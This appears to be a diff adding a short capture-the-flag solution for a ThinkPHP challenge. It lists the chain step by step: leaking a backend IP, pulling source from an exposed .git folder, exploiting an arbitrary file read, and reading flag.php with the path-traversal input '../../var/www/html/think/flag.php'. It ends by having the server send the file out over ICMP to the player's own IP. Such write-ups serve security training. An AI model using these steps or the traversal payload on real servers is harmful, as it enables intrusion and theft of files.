@@ -1,0 +1,8 @@
+1. send the message s:12.34.56.78 (to get the ip of the backend server)
+2. scan the backend server and find .git folder, then you can get the source code with githack
+3. audit the code, then find the arbitrary file read in function s() in TestController.php
+4. using the thinkphp fault page to get the absolute path of flag.php: /var/www/html/think/flag.php
+5. read the file with message:     p:../../var/www/html/think/flag.php
+6. reload the gun with message:    r:
+7. shoot at your ip address:       s:123.45.67.89
+8. record the extra data in icmp, and assemble them, then base64 decode, finally obtain the real flag;
